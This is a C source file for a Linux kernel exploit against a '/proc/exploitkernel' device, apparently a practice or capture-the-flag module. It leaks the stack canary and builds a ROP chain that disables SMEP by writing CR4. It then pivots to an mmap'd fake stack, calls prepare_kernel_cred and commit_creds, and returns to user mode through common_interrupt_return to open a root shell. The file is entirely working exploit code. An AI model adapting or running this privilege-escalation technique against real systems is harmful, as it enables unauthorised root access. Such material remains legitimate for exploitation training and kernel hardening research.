#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void shell(void){

    if (getuid() != 0) {
        printf("UID = %d :-(\n", getuid());
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) shell;

int main() {

    save_state();

    int fd = open("/proc/exploitkernel", O_RDWR);
    if (fd < 0) {
        puts("Failed to open /proc/exploitkernel");
        exit(-1);
    }

    unsigned long leak[5];;
    read(fd, leak, sizeof(leak));

    unsigned long canary = leak[1];
    printf("Canary = 0x%016lx\n", canary);

    unsigned long payload[40] = { 0 };
    
    payload[1] = canary;

    int i = 4;
    payload[i++] = 0xffffffff811ad2ec;  // pop rdi; ret;
    payload[i++] = 0x6B0;
    payload[i++] = 0xffffffff811c3843;  // mov cr4, rdi; mov r12, r15; ret 8;
    payload[i++] = 0xffffffff81022d82;  // ret
    payload[i++] = 0xffffffff81022d82;  // ret
    payload[i++] = 0xffffffff81022d81;  // pop rax; ret;
    payload[i++] = 0xc0d30000;         // fake_stack
    payload[i++] = 0xffffffff81265330; // mov esp, eax; mov rax, r12; pop r12; pop rbp; ret;

    // Fake Stack
    unsigned long *fake_stack = mmap((void *) (0xc0d30000 - 0x1000), 0x2000,
		    PROT_READ|PROT_WRITE|PROT_EXEC,
		    MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);

    if (fake_stack == MAP_FAILED) {
	    perror("mmap");
	    exit(-1);
    }

    fake_stack[0]   = 0xdeadbeefdeadbeef;

    i = 512;
    fake_stack[i++] = 0xdeadbeefdeadbeef;
    fake_stack[i++] = 0xdeadbeefdeadbeef;
    fake_stack[i++] = 0xffffffff811ad2ec; // pop rdi; ret;
    fake_stack[i++] = 0;
    fake_stack[i++] = 0xffffffff8106b6a0; // prepare_kernel_cred
    fake_stack[i++] = 0xffffffff8100534f; // mov r8, rax; mov rax, r8; ret;
    fake_stack[i++] = 0xffffffff81113e1b; // mov rdx, r8; ret;
    fake_stack[i++] = 0xffffffff811b794e; // mov rdi, rax; cmp rdi, rdx; jne 0x3b7945; xor eax, eax; ret;
    fake_stack[i++] = 0xffffffff8106b500; // commit_creds
    fake_stack[i++] = 0xffffffff81400cc6; // common_interrupt_return+22: mov rdi,rsp
    fake_stack[i++] = 0;
    fake_stack[i++] = 0;
    fake_stack[i++] = user_rip;
    fake_stack[i++] = user_cs;
    fake_stack[i++] = user_rflags;
    fake_stack[i++] = user_sp;
    fake_stack[i++] = user_ss;

    write(fd, payload, sizeof(payload));

    return 0;
}

